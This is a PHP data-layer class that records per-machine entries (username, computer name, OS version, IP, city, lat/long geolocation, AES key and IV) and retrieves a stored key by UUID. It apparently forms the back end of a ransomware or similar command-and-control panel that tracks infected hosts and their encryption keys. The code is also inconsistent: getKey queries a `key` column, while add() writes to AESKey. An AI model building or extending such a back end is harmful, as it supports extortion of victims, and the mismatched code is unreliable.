<?php

require_once 'model.php';


class Users {


    public static function add($uuid, $username, $computername, $langId, $country, $region, $city, $latlong, $osversion, $key, $iv, $ip){
        if (empty($uuid) || empty($username) || empty($computername) || empty($langId) || empty($country) || empty($region) || empty($city) || empty($latlong) || empty($osversion) || empty($key) || empty($iv) || empty($ip)) {
            return "empty fields";
        }
        $pdo = Model::getPdo();
        try {
            $pdo->beginTransaction();
            $stmt = $pdo->prepare("INSERT INTO users (uuid, username, computername, langId, country, region, city, latlong, osversion, AESKey, iv, ip, date, time) 
            VALUES (:uuid, :username, :computername, :langId, :country, :region, :city, :latlong, :osversion, :key, :iv, :ip, CURDATE(), CURTIME())");
            $params = array(
                ':uuid' => $uuid, ':username' => $username,':computername' => $computername,
                ':langId' => $langId,':country' => $country,':region' => $region,
                ':city' => $city,':latlong' => $latlong,':osversion' => $osversion,
                ':key' => $key,':iv' => $iv,':ip' => $ip
            );
           $success = $stmt->execute($params);
            if ($success) {
                $pdo->commit();
                return true;
            } else {
                $pdo->rollBack();
                return false;
            }
        } catch (PDOException $e) {
            $pdo->rollBack();
            error_log("Error adding user: " . $e->getMessage());
            return $e->getMessage();
        }
    }

    public static function getKey($uuid){
        try {
            $pdo = Model::getPdo();
            $stmt = $pdo->prepare("SELECT `key` FROM users WHERE uuid = :uuid");
            $stmt->bindParam(':uuid', $uuid);
            $stmt->execute();
            $result = $stmt->fetchAll();
            return $result;
        } catch (PDOException $e) {
            error_log("Error getting key: " . $e->getMessage());
            return false;
        }
        
    }
    

}